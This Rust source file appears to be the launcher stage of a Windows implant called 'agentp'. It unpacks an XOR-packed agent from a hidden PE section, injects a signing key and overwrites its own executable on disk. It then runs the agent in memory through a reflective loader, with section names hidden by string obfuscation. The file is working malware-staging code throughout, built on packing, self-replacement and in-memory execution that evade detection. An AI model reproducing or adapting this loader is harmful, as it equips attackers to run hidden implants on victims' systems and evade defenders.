use std::{env, fs};

use common::crypto;
use object::{
    pe::ImageNtHeaders64, read::pe::PeFile, LittleEndian, Object as _, ObjectSection as _,
};

#[cfg(debug_assertions)]
const BIN: &[u8] = include_bytes!("../../../target/x86_64-pc-windows-gnu/debug/agentp.exe");
#[cfg(not(debug_assertions))]
const BIN: &[u8] = include_bytes!("../../../target/x86_64-pc-windows-gnu/release/agentp.exe");
const XOR_KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/xor_key"));

// TODO Parse PE myself so I don't have to clone BIN to find the sections
fn section_file_range(file: &PeFile<ImageNtHeaders64>, name: &str) -> Option<(u64, u64)> {
    return file.sections().filter(|s| s.name().is_ok()).find_map(|s| {
        if s.name() == Ok(name) {
            s.file_range()
        } else {
            None
        }
    });
}

fn rva_to_file_offset(file: &PeFile<ImageNtHeaders64>, rva: u64) -> u64 {
    let section_header = file
        .section_by_name(obfstr::obfstr!(".rdata"))
        .unwrap()
        .pe_section();
    let rdata_va = section_header.virtual_address.get(LittleEndian);
    let rdata_raw_addr = section_header.pointer_to_raw_data.get(LittleEndian);
    let base = file.relative_address_base();
    rva - base - rdata_va as u64 + rdata_raw_addr as u64
}

fn packed_agent_mut(bin: &mut [u8]) -> Result<&mut [u8], Box<dyn std::error::Error>> {
    let pe = PeFile::<ImageNtHeaders64>::parse(&bin)?;
    let (offset, size) = section_file_range(&pe, obfstr::obfstr!("bin")).unwrap();
    let bin_section = &bin[offset as usize..][..size as usize];
    let addr = <&[u8] as TryInto<[u8; 8]>>::try_into(&bin_section[..8])?;
    let addr = rva_to_file_offset(&pe, u64::from_le_bytes(addr));
    let size = <&[u8] as TryInto<[u8; 8]>>::try_into(&bin_section[8..])?;
    let size = usize::from_le_bytes(size);
    Ok(&mut bin[addr as usize..][..size])
}

fn secret_key_mut(agent: &mut [u8]) -> Result<&mut [u8], Box<dyn std::error::Error>> {
    let agent_pe = PeFile::<ImageNtHeaders64>::parse(&agent)?;
    let (offset, size) = section_file_range(&agent_pe, obfstr::obfstr!(".sk")).unwrap();
    Ok(&mut agent[offset as usize..][..size as usize])
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut buf = BIN.to_vec();

    // Set a secret key in the agent
    let agent_slice = packed_agent_mut(&mut buf)?;
    let mut agent = common::unpack_to_vec(agent_slice, XOR_KEY);
    secret_key_mut(&mut agent)?.copy_from_slice(crypto::get_signing_key().as_bytes());
    let packed_agent = common::pack_to_vec(&agent, XOR_KEY);
    agent_slice[..packed_agent.len()].copy_from_slice(&packed_agent);

    // Replace the current executable with the updated one
    let tmp = env::current_exe()?.with_extension(obfstr::obfstr!("tmp"));
    fs::write(&tmp, &buf)?;
    self_replace::self_replace(&tmp)?;
    fs::remove_file(&tmp)?;

    // Start the agent
    unsafe { rspe::reflective_loader(buf) }
    Ok(())
}
